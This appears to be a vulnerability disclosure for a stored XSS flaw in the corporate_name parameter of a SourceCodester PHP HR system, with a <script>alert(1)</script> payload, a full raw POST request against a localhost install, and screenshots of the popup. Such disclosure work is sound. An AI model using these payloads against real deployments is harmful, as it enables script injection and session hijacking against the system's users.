#### BUG_AUTHOR:LIU WEIYU
## Human Resource Information System – Stored XSS on (Superadmin_Dashboard/process/addcorporate_process.php corporate_name parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/14714/human-resource-information-using-phpmysqliobject-orientedcomplete-free-sourcecode.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
Superadmin_Dashboard/process/addcorporate_process.php 

On this page, corporate_name parameter is vulnerable to Stored XSS Attack 
### Proof of vulnerability:
#### Payload：
<script>alert(1)</script>
#### Request:
```
POST http://localhost/Human%20Resource%20Information%20System%202020/Superadmin_Dashboard/process/addcorporate_process.php HTTP/1.1
Host: localhost
Content-Length: 60
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/Human%20Resource%20Information%20System%202020/Superadmin_Dashboard/Add_corporate.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=dmbqp07an31thhtebo1f649jii
Connection: close

corporate_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&corp=
 ```
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/be186e26-5af4-4987-a14e-2f4de65f5931">

### Trigger popup(The data has been stored in the database)：

<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/f7e7d098-0787-4bd3-81c7-03944d49c88e">

